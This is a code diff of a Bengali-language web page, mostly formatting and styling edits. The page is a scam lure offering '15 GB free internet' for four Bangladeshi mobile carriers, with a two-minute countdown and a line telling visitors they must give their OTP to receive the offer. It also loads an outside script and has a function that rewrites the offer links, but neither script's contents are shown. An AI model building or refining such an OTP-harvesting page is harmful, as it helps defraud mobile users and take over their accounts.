@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" type="text/css" href="css/main.css">
     <link rel="stylesheet" type="text/css" href="css/style.css">
-	<script src="https://admomin.github.io/new-12em-107/pohelaboishak.js"></script>
+    <script src="https://admomin.github.io/new-12em-107/pohelaboishak.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri&display=swap');
 
@@ -41,9 +41,11 @@
 
         .btn {
             font-size: 30px;
+            border-radius: 50px;
+            border: 5px solid black;
         }
 
-		.shei {
+        .shei {
             position: absolute;
             top: 0;
             left: 0;
@@ -52,28 +54,28 @@
             z-index: 1;
         }
 
-		.gplink {
-			background-color: #5BBCFF;
-		}
+        .gplink {
+            background-color: #5BBCFF;
+        }
 
-		.bllink {
-			background-color: #DC6B19;
-		}
+        .bllink {
+            background-color: #DC6B19;
+        }
 
-		.arlink {
-			background-color: #FF0000;
-		}
+        .arlink {
+            background-color: #FF0000;
+        }
 
-		.rblink {
-			background-color: #D20062;
-		}
+        .rblink {
+            background-color: #D20062;
+        }
     </style>
 </head>
 
 <body>
-    <div class="container mt-5">
-        <div class="row mainbae p-5">
-            <div class="col-md-6 mx-auto text-center shei">
+    <div class="container mt-4">
+        <div class="row mainbae p-4">
+            <div class="col-6 mx-auto text-center shei">
                 <div class="suvo-novoborsho center">
                     <ul>
                         <li><a href="#">১</a></li>
@@ -84,28 +86,33 @@
                 </div>
             </div>
             <div class="col-md-6 mx-auto text-center">
-                <!-- Add the rounded-image class to the parent div of the image -->
                 <div class="rounded-image">
                     <img src="newyearbanner.png" alt="New Year Banner" class="w-100 img-fluid">
                 </div>
                 <div class="mt-3">
+                    <hr>
                     <div id="countdown">
                         <strong>মাত্র <span id="minutes" class="text-danger">02</span> মিনিট <span class="text-danger"
                                 id="seconds">00</span> সেকেন্ড সময় বাকি আছে </strong>
                     </div>
+                    <hr>
                 </div>
                 <h1 class="fw-bold text-center text-danger fs-2 m-2">নিচে থেকে অফার সিলেক্ট করুন</h1>
                 <div class="mt-3">
-                    <a role="button" class="btn btn-warning w-100 bllink">বাংলালিংক ১৫ জিবি ফ্রি ইন্টারনেট</a>
+                    <a role="button" class="btn btn-warning w-100 bllink rounded-5" href="#">বাংলালিংক ১৫ জিবি ফ্রি
+                        ইন্টারনেট</a>
                 </div>
                 <div class="mt-3">
-                    <a role="button" class="btn btn-primary w-100 gplink">গ্রামীনফোন ১৫ জিবি ফ্রি ইন্টারনেট</a>
+                    <a role="button" class="btn btn-primary w-100 gplink rounded-5" href="#">গ্রামীনফোন ১৫ জিবি ফ্রি
+                        ইন্টারনেট</a>
                 </div>
                 <div class="mt-3">
-                    <a role="button" class="btn btn-danger w-100 rblink">রবি ১৫ জিবি ফ্রি ইন্টারনেট</a>
+                    <a role="button" class="btn btn-danger w-100 rblink rounded-5" href="#">রবি ১৫ জিবি ফ্রি
+                        ইন্টারনেট</a>
                 </div>
                 <div class="mt-3">
-                    <a role="button" class="btn btn-danger w-100 arlink">এয়ারটেল ১৫ জিবি ফ্রি ইন্টারনেট</a>
+                    <a role="button" class="btn btn-danger w-100 arlink rounded-5" href="#">এয়ারটেল ১৫ জিবি ফ্রি
+                        ইন্টারনেট</a>
                 </div>
                 <p class="text-center text-decoration-underline fs-4 rounded-4 m-3 p-1">OTP না দিলে কোনো অফার আসবে
                     না। মনে রাখবেন OTP দিয়ে আপনার অফার দেয়া হয়।</p>
@@ -115,7 +122,7 @@
     <script src="js/jquery-1.7.2.min.js" type="text/javascript" charset="utf-8"></script>
     <script src="js/animation.js" type="text/javascript" charset="utf-8" async defer></script>
     <script src="js/slider.js" type="text/javascript" charset="utf-8" async defer></script>
-	<script>
+    <script>
         function changeHref(className, newHref) {
             var elements = document.getElementsByClassName(className);
 
